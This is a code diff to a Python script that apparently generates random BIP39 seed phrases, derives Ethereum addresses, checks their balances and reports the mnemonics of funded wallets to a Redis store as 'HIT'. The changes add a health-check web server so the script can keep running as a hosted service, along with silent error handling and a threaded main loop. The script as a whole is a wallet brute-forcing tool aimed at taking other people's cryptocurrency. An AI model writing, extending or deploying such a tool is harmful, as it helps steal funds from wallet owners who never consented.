@@ -1,7 +1,8 @@
 #!/usr/bin/env python3
-import hashlib, secrets, time, os, requests
+import hashlib, secrets, time, os, requests, threading
 from datetime import datetime
 from typing import Optional, Dict, Any
+from http.server import HTTPServer, BaseHTTPRequestHandler
 from web3 import Web3
 from bip_utils import Bip39SeedGenerator, Bip44, Bip44Coins, Bip44Changes
 
@@ -14,6 +15,25 @@ except:
 SEUIL_ETH = 0.00000001
 UPSTASH_URL = os.getenv("UPSTASH_REDIS_REST_URL", "")
 UPSTASH_TOKEN = os.getenv("UPSTASH_REDIS_REST_TOKEN", "")
+PORT = int(os.getenv("PORT", "10000"))
+
+class HealthHandler(BaseHTTPRequestHandler):
+    def do_GET(self):
+        if self.path in ("/", "/health", "/healthz"):
+            self.send_response(200)
+            self.send_header("Content-Type", "text/plain")
+            self.end_headers()
+            self.wfile.write(b"ok")
+        else:
+            self.send_response(404)
+            self.end_headers()
+    def log_message(self, format, *args):
+        pass
+
+def start_health_server():
+    server = HTTPServer(("0.0.0.0", PORT), HealthHandler)
+    print(f"Health endpoint on :{PORT}/health")
+    server.serve_forever()
 
 class Generateur:
     def generer(self) -> str:
@@ -49,7 +69,10 @@ class SignaleurRedis:
         self.headers = {"Authorization": f"Bearer {UPSTASH_TOKEN}"}
     def _redis(self, cmd):
         if not UPSTASH_URL: return
-        requests.post(UPSTASH_URL, headers=self.headers, json=cmd, timeout=5)
+        try:
+            requests.post(UPSTASH_URL, headers=self.headers, json=cmd, timeout=5)
+        except:
+            pass
     def traiter(self, mnemonic, adresse, info):
         if not info.get("ok") or info.get("solde_eth", 0) <= SEUIL_ETH:
             return False
@@ -60,7 +83,7 @@ class SignaleurRedis:
         print(f"HIT: {adresse} {info['solde_eth']} ETH")
         return True
 
-def main():
+def moteur_loop():
     print("Moteur Ethereum démarré")
     gen = Generateur()
     conv = Convertisseur()
@@ -79,4 +102,5 @@ def main():
         time.sleep(0.1)
 
 if __name__ == "__main__":
-    main()
+    threading.Thread(target=start_health_server, daemon=True).start()
+    moteur_loop()
